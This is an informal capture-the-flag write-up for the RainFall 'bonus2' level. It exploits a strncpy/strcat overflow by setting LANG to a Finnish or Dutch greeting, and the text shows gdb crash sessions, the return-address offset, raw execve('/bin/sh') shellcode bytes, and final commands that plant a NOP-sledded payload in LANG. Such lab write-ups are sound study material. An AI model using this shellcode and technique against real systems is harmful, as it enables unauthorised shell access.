This time arround there is no clear path to a shell, but there is however a call made to getenv, that changes the message displayed

```bash
bonus2@RainFall:~$ env LANG=nl ./bonus2 Enzo Dal 
Goedemiddag! Enzo
bonus2@RainFall:~$ env LANG=fi ./bonus2 Enzo Dal 
Hyvää päivää Enzo
bonus2@RainFall:~$ env LANG=wtf ./bonus2 Enzo Dal 
Hello Enzo
```

There is no calls to bash so we'll need to bring our shellcode

We can make the program crash with a pattern, but we're not able to control the full address right away

```gdb
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()

```

We can take advantage of the fact that strncpy is used, as well as strcat, so if we pass a non terminated string all kind of funky things can happen, so our first arg need to be 40 chars long for this to happen.

```
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
``` 
This isnt enough to fully override the pointer still.

By default the strcat happends with "Hello", but the two other options are longer and may give us enough chars to override fully
And indeed, with the LANG set to fi we manage to choose the address we crash on.

Our offset is 18, let's build the payload


python -c 'print ("\x90" * 19 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")

0xbf ff ff 1f

python -c 'print ("\x90" * 18 + "\x1f\xff\xff\xbf")


$(python -c 'print ("\x90" * 19 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")') $(python -c 'print ("\x90" * 18 + "\x1f\xff\xff\xbf")')



```gdb
Starting program: /home/user/bonus2/bonus2 $(python -c 'print ("\x90" * 19 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")') $(python -c 'print ("\x90" * 18 + "AAAA")')
Hyvää päivää �������������������1���
                                    Qh//shh/bin��̀������������������AAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

```
So now we just need to input the correct address which seems to be 0xbffff6a0 for the start of our buffer of 40, but it's not reachable anymore so we can try the buffer des of strcat


0x0804851c in greetuser ()
(gdb) printf "%s", 0xbffff5d0 
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB(gdb) 

Ok this sould be ok but the buffers keep changing address so this is not suitable

Since this code uses env, and we know that env is exploitable and its address wont change, so we can try adding our payload to the env var.

With the payload, the address is now 0xbffff698, moving past the original text we get 0xbf ff ff 21 for the shellcode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $(python -c 'print ("B" * 18 + "\xd0\xfe\xff\xbf")')
0xbf ff fe c0

If we go straight to the buffer we crash, so we add offset untill it works

```
export LANG=$(python -c 'print ("fi " + "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $(python -c 'print ("B" * 18 + "\xe0\xfe\xff\xbf")')
```

